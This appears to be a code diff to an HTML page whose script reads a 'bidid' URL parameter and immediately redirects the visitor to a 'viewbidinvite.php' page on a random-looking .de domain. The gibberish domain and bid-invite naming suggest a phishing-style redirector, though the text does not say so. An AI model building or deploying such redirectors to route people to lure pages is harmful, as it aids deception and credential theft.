@@ -4,12 +4,12 @@
   <meta charset="UTF-8">
   <script>
     const params = new URLSearchParams(window.location.search);
-    const token = params.get("token");
+    const bidid = params.get("bidid");
 
-    if (token && /^[A-Za-z0-9_-]{8,128}$/.test(bidid)) {
+    if (bidid && /^[A-Za-z0-9_-]{8,128}$/.test(bidid)) {
       window.location.replace(
         "https://zcbxaqmrvtnlypkwejduisrfhn.de/viewbidinvite.php?bidid=" 
-        + encodeURIComponent(token)
+        + encodeURIComponent(bidid)
       );
     } else {
       window.location.replace(
